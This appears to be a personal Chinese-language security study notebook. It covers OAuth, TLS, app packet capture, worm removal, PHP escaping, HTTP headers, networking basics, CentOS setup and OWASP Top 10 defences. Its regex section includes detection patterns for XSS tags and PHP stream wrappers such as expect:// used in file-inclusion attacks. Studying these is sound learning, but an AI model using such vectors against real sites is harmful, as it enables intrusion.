<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a步骤授权所需</span><br><span class="line">	应用名称</span><br><span class="line">	应用网站</span><br><span class="line">	重定向url或回调url(redirect_url)</span><br><span class="line">	客户端表示client_id</span><br><span class="line">	客户端密钥client_secret</span><br><span class="line">	</span><br><span class="line">oauth授权方式</span><br><span class="line">	1.授权码模式</span><br><span class="line">		刷新token模式 给了个有效时间和到期更新时提交的fresh_token值</span><br><span class="line">	2.简化模式</span><br><span class="line">		没有重定向的步骤直接返回了token</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\implicit_grant.png" alt="implicit_grant"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密码模式</span><br><span class="line">用户向客户端提供自己的账号密码</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\oauth_passwd.png" alt="oauth_passwd"></p>
<h3 id="https技术鉴赏"><a href="#https技术鉴赏" class="headerlink" title="https技术鉴赏"></a>https技术鉴赏</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1uY4y1D7Ng</span><br><span class="line">凯撒密码(简单移位)-&gt;恩格码机(古典密码学)-&gt;DES</span><br><span class="line">需要密钥 DES 56位 对称加密</span><br><span class="line">非对称加密	公钥私钥成对出现</span><br><span class="line">公钥加密只能被私钥解密 私钥加密只能被公钥解密</span><br><span class="line">SSL握手 安全套接字</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\ssl.png" alt="ssl"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SSL1.0 2.0 3.0</span><br><span class="line">TLS1.0(SSL3.1) 1.1 1.2 1.3</span><br><span class="line">如果攻击者在获取公钥步骤进行盗取----&gt;&gt;&gt;&gt;CA证书</span><br><span class="line">CA(Certificate Authority)</span><br><span class="line">数据和加密后的数据构成证书</span><br><span class="line"></span><br><span class="line">CA机构造假----&gt;&gt;&gt;&gt;棱镜门</span><br><span class="line">证书透明 证书加入SCT 构成日志 监督日志 像区块链</span><br><span class="line"></span><br><span class="line">仍存在未解决的问题</span><br></pre></td></tr></table></figure>

<h3 id="手机app抓包渗透"><a href="#手机app抓包渗透" class="headerlink" title="手机app抓包渗透"></a>手机app抓包渗透</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">小米路由器需要设置WPA2模式加密</span><br><span class="line">同一局域网下 手机代理ip端口设为pc端局域网ip 192.168.31.90:8881</span><br><span class="line">即可抓包 不过慢</span><br></pre></td></tr></table></figure>

<h3 id="蠕虫病毒Synaptics-exe"><a href="#蠕虫病毒Synaptics-exe" class="headerlink" title="蠕虫病毒Synaptics.exe"></a>蠕虫病毒Synaptics.exe</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\BaiduNetdiskDownload\北山学院直播班\北山学院工具脚本\云安全\小程序反编译（软件尽量在虚拟机运行）\wxappUnpacker\wxappUnpacker.exe 小程序解密文件运行就会出问题</span><br><span class="line"></span><br><span class="line">everything 删除._cache_</span><br><span class="line">删除C:\ProgramData\Synaptics</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u013102599/article/details/127512616</span><br></pre></td></tr></table></figure>

<h3 id="注册表删除-md后缀默认程序"><a href="#注册表删除-md后缀默认程序" class="headerlink" title="注册表删除.md后缀默认程序"></a>注册表删除.md后缀默认程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win11注册表中 第二项影响大于第一项</span><br><span class="line">1.删除	计算机\HKEY_CURRENT_USER\.md</span><br><span class="line">2.删除	计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.md</span><br><span class="line">然后任务管理器重启资源管理器</span><br></pre></td></tr></table></figure>

<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/ZYC88888/article/details/98479629</span><br><span class="line">\x22	16进制unicode编码</span><br><span class="line">.	点 匹任何单个字符</span><br><span class="line">* &#123;0,&#125;</span><br><span class="line">+ &#123;1,&#125;</span><br><span class="line">? &#123;0,1&#125;	非贪婪模式匹配一个 除了?:(pattern)</span><br><span class="line">[^xyz]	不匹配xyz的单个字符</span><br><span class="line">?!(pattern)</span><br><span class="line">&#x27;oooo&#x27;	&#x27;o+&#x27;--&gt;&gt;[&quot;oooo&quot;]	&#x27;o+?&#x27;--&gt;&gt;[&#x27;o&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;o&#x27;]	前者贪婪模式	后者加上?非贪婪模式</span><br><span class="line"></span><br><span class="line">no matching regex</span><br><span class="line">(?:firefox|mozilla|baidu|googleapis|google|fjlqqc|google-analytics|youtube|stripe|fengkongcloud|hcfy|microsoft|firefoxchina|bingapis|wetab|bdimg|azureedge|bing|csdnimg)\.(?:net|org|com|cn|app|link)</span><br><span class="line"></span><br><span class="line">pycharm的正则替换	点亮Cc和.* 第一行写正则去匹配 第二行写改变的格式每一个之前匹配的都被搞成变量$1 $2存起来了 然后单机replace all</span><br><span class="line">^([^ ]*): (.*)		此处需要不匹配上面post_data的数据</span><br><span class="line">&quot;$1&quot;: &quot;$2&quot;,</span><br><span class="line"></span><br><span class="line">(&lt;script&gt;)</span><br><span class="line">(?:&lt;script&gt;|onmouseover|)</span><br><span class="line">(?:data|php|zlib|expect|glob|ssh2)(://)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230405144757515.png" alt="image-20230405144757515"></p>
<h3 id="php-过滤函数"><a href="#php-过滤函数" class="headerlink" title="php 过滤函数"></a>php 过滤函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">★addslashes()</span><br><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line">预定义字符是：</span><br><span class="line"> 单引号（&#x27;）</span><br><span class="line"> 双引号（&quot;）</span><br><span class="line"> 反斜杠（\）</span><br><span class="line"> NULL</span><br><span class="line">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</span><br><span class="line">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</span><br><span class="line">语法：addslashes(string)</span><br><span class="line">string 必需。规定要转义的字符串。</span><br><span class="line">返回值： 返回已转义的字符串。</span><br><span class="line">PHP 版本： 4+</span><br><span class="line">★stripslashes()</span><br><span class="line">函数删除由 addslashes() 函数添加的反斜杠。 </span><br><span class="line">★mysql_real_escape_string()</span><br><span class="line">函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line">下列字符受影响：</span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\ </span><br><span class="line">&#x27; </span><br><span class="line">&quot; </span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line">语法：mysql_real_escape_string(string,connection)</span><br><span class="line">参数 描述</span><br><span class="line">string 必需。规定要转义的字符串。</span><br><span class="line">connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</span><br><span class="line">说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()</span><br></pre></td></tr></table></figure>

<h3 id="HTTP-头部"><a href="#HTTP-头部" class="headerlink" title="HTTP 头部"></a>HTTP 头部</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1、 Accept：告诉 WEB 服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。</span><br><span class="line">2、 Accept-Charset： 浏览器申明自己接收的字符集 Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）Accept-Language：：浏览器申明自己接收的语言</span><br><span class="line">语言跟字符集的区别：中文是语言，中文有多种字符集，比如 big5，gb2312，gbk 等等。</span><br><span class="line">3、 Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。</span><br><span class="line">4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</span><br><span class="line">5、 Authorization：当客户端接收到来自 WEB 服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给 WEB 服务器。</span><br><span class="line">6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从 WEB 服务器去取）max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象）max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值）min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）响应：public(可以用 Cached 内容回应任何用户)private（只能用缓存内容回应先前请求该内容的那个用户）no-cache（可以缓存，但是只有在跟 WEB 服务器验证了其有效后，才能返回给客户端）max-age：（本响应包含的对象的过期时间）ALL: no-store（不允许缓存）</span><br><span class="line">7、 Connection：请求：close（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。</span><br><span class="line">keepalive（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。响应：close（连接已经关闭）。keepalive（连接保持着，在等待本次连接的后续请求）。Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300</span><br><span class="line">8、 Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip</span><br><span class="line">9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。</span><br><span class="line">10、Content-Length：WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012</span><br><span class="line">11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022</span><br><span class="line">12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml</span><br><span class="line">13、 ETag：就是一个对象（比如 URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以 ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给 WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。</span><br><span class="line">14、 Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB 服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT</span><br><span class="line">15、 Host：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn</span><br><span class="line">16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。</span><br><span class="line">17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。</span><br><span class="line">18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码 304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT</span><br><span class="line">19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</span><br><span class="line">20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。</span><br><span class="line">21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT</span><br><span class="line">22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取 。 例如 ： Location ： http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</span><br><span class="line">23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache</span><br><span class="line">24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</span><br><span class="line">25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546- 26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer:http://www.sina.com/</span><br><span class="line">27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix)</span><br><span class="line">28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14</span><br><span class="line">29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked</span><br><span class="line">30、 Vary: WEB 服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源 WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding</span><br><span class="line">31、 Via： 列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添 加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的 Via 头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13</span><br></pre></td></tr></table></figure>

<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符</span><br><span class="line">字符集</span><br><span class="line">字符编码</span><br><span class="line">ASCII</span><br><span class="line">GB2312	常见的6700多个中文字符集	16位</span><br><span class="line">GBK		汉字内码扩展规范  微软  技术规范</span><br><span class="line">UNICODE	万国码 统一码</span><br></pre></td></tr></table></figure>

<h3 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">网卡VMware Network Adapter VMnet0	桥接模式	Bridged</span><br><span class="line">网卡VMware Network Adapter VMnet1	仅主机模式	Host-Only</span><br><span class="line">网卡VMware Network Adapter VMnet8	NAT模式		网络地址转换模式</span><br><span class="line">https://blog.csdn.net/qq_39192827/article/details/85872025</span><br><span class="line"></span><br><span class="line"># 私有地址 内网地址</span><br><span class="line">A类							私有地址</span><br><span class="line">0 网络号 7位 主机号24位	10.0.0.0-10.255.255.255			10  00001010</span><br><span class="line">B类</span><br><span class="line">10 网络号14位 主机号16位	172.16.0.0-172.31.255.255		172  10101100</span><br><span class="line">C类</span><br><span class="line">110 网络号21位 主机号8位	192.168.0.0-192.168.255.255		192  11000000</span><br><span class="line">D类</span><br><span class="line">1110		多点广播</span><br><span class="line">E类</span><br><span class="line">11110		保留</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 特殊地址</span><br><span class="line">A类系统回环地址：127.0.0.0-----127.255.255.255</span><br><span class="line">每个计算机都有一个本地环回接口地址，是127.0.0.1，这个地址是用来测试本机的TCP/IP协议栈有没有正确安装的。</span><br><span class="line">B类地址：168.192.0.0---168.192.255.255</span><br><span class="line">B类保留地址：169.254.0.0----169.254.255.255</span><br><span class="line">D类地址：224.0.0.0-----239.255.255.255</span><br><span class="line">E类地址：240.0.0.0-----255.255.255.255</span><br><span class="line"></span><br><span class="line">0代表网络号 255代表广播地址 不能用</span><br><span class="line"></span><br><span class="line">百度搜ip</span><br><span class="line">公有ip117.136.119.167</span><br><span class="line">校园网是分配认证一个新的ip地址</span><br><span class="line">Ping 127.0.0.1通表明网络功能安装好了，具备可以上网的条件</span><br><span class="line">127.0.0.1-127.255.255.255用于回路测试</span><br><span class="line"></span><br><span class="line">端口具体到程序（QQ 微信 微博） 	0-65535（2的16次）标记程序</span><br><span class="line">进出网络程序的通道</span><br><span class="line">分类</span><br><span class="line">知名端口 0-1023 		特殊程序		超级管理员</span><br><span class="line">21端口		分配给FTP</span><br><span class="line">22端口 		ssh远程登录Linux系统</span><br><span class="line">80端口		网站一般用端口</span><br><span class="line">69端口		用于文件下载</span><br><span class="line"></span><br><span class="line">动态端口 1024-65535	普通 			直接用</span><br><span class="line"></span><br><span class="line">netstat --help</span><br><span class="line">netstat -an	查看端口状态</span><br><span class="line">netstat -ano</span><br><span class="line">isof -i [tcp/udp]:2425</span><br></pre></td></tr></table></figure>

<h3 id="jdk与jre与java"><a href="#jdk与jre与java" class="headerlink" title="jdk与jre与java"></a>jdk与jre与java</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_42257666/article/details/105701938</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">jdk比jre多一个虚拟环境 jre是.java文件的解释器 开发用jdk 相当于程序员和操作系统中间夹了jdk(虚拟机环境+jre)</span></span><br><span class="line"></span><br><span class="line">Java X=Java SE X=JDK1.X</span><br><span class="line">Java SE 8就是Java8，或者jdk1.8</span><br></pre></td></tr></table></figure>

<h3 id="浏览器工作原理"><a href="#浏览器工作原理" class="headerlink" title="浏览器工作原理"></a>浏览器工作原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.输入url 用户在浏览器中输入网址(包含所需资源位置和协议)</span><br><span class="line">2.DNS查询</span><br><span class="line">3.建立链接 根据url协议与目标服务器建立链接</span><br><span class="line">4.发送请求 浏览器向服务器发送http请求 请求中包含资源路径和请求方法</span><br><span class="line">5.服务器响应</span><br><span class="line"></span><br><span class="line">6.渲染页面 浏览器收到html文件后 开始解析并构建文档对象模型(DOM)。DOM是网页结构化表示，可以通过javascript进行操作。</span><br><span class="line">7.加载资源 浏览器发现html文件中其他资源(CSS js 图片)发送额外请求来获取这些资源。同时会根据css贵族对页面进行样式渲染。</span><br><span class="line">8.执行js 浏览器运行js代码 可能会操作dom 更改样式或与服务器进一步通信 js使页面更具动态和交互性。</span><br><span class="line"></span><br><span class="line">9.显示完成</span><br><span class="line">10.关闭连接</span><br></pre></td></tr></table></figure>

<h3 id="Centos安装"><a href="#Centos安装" class="headerlink" title="Centos安装"></a>Centos安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/m0_59430185/article/details/119108112</span><br><span class="line">配置</span><br><span class="line">	字符集为UTF-8				这个搞错终端中文字符乱码</span><br><span class="line">	echo LANG=”zh_CN.UTF-8” &gt; /etc/locale.conf</span><br><span class="line">启用网卡</span><br><span class="line">	echo ONBOOT=yes &gt;&gt; /etc/sysconfig/net-scripts/ifcfg-ens33</span><br><span class="line">修改时间</span><br><span class="line">	date -s “2022/5/11 12:12:12” </span><br><span class="line">ssh服务</span><br><span class="line">	首先查看是否安装openssh-server</span><br><span class="line">yum list installed | grep openssh-server没装yum装</span><br><span class="line">root权限</span><br><span class="line">service sshd start打开</span><br><span class="line">ps -e | grep sshd或者netstat -an | grep 22检查ssh是否打开</span><br><span class="line">[Centos开启SSH服务_心若十年的博客-CSDN博客_centos开启ssh服务](https://blog.csdn.net/qq_41768362/article/details/117331798)</span><br></pre></td></tr></table></figure>

<h3 id="owasp-top10"><a href="#owasp-top10" class="headerlink" title="owasp top10"></a>owasp top10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2017</span><br><span class="line">注入</span><br><span class="line">认证崩溃</span><br><span class="line">敏感数据暴露</span><br><span class="line">XML外部实体(XXE)</span><br><span class="line">访问控制崩溃</span><br><span class="line">安全配置不当</span><br><span class="line">跨站脚本</span><br><span class="line">不安全的反序列化</span><br><span class="line">使用含有已知漏洞的组件</span><br><span class="line">日志记录和监控不充分</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2021</span><br><span class="line">访问控制崩溃</span><br><span class="line">加密失败</span><br><span class="line">注入</span><br><span class="line">不安全的设计</span><br><span class="line">安全配置不当(XML外部实体(XXE))</span><br><span class="line">易受攻击和过时的组件</span><br><span class="line">识别和认证失败(认证崩溃)</span><br><span class="line">软件和数据完整性失败</span><br><span class="line">安全日志记录和监控不充分</span><br><span class="line">服务器请求伪造</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">访问控制崩溃</span><br><span class="line">通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可利用这个漏洞去查看未授权的功能和数据</span><br><span class="line">e.g.用户账户、敏感文件、获取和正常用户相同的权限</span><br><span class="line">水平越权 垂直越权</span><br><span class="line">防范：访问控制 只有在受信服务器端代码或没有服务器的API中有效，这样攻击者才无法控制检查或元数据</span><br><span class="line">	除公有资源外，默认情况下拒绝访问</span><br><span class="line">	严格判断权限，用户只能操作属于自己的内容</span><br><span class="line">	记录失败的访问控制，并在适当时向管理员告警</span><br><span class="line">	对API和控制器的访问进行速率限制，以最大限度降低自动化攻击的危害</span><br><span class="line">	当用户注销后，服务器的JWT令牌失效</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">敏感数据暴露</span><br><span class="line">phpinfo等</span><br><span class="line">	防范：</span><br><span class="line">		加强员工意识 禁传代码到GitHub</span><br><span class="line">		慎用第三方云服务 不要把工作相关带到云端</span><br><span class="line">		禁用工作邮箱注册非工作相关网站</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注入</span><br><span class="line">对用户输入数据合法性没有判断或过滤不严</span><br><span class="line">能与用户交互的地方都可能存在注入</span><br><span class="line">防范：</span><br><span class="line">	关闭sql错误回显</span><br><span class="line">	使用成熟的waf</span><br><span class="line">	前端输入字符白名单验证（长度、类型）</span><br><span class="line">	sql服务运行与专门账号，且使用最小权限</span><br><span class="line">	对输入特殊字符进行转义处理</span><br></pre></td></tr></table></figure>

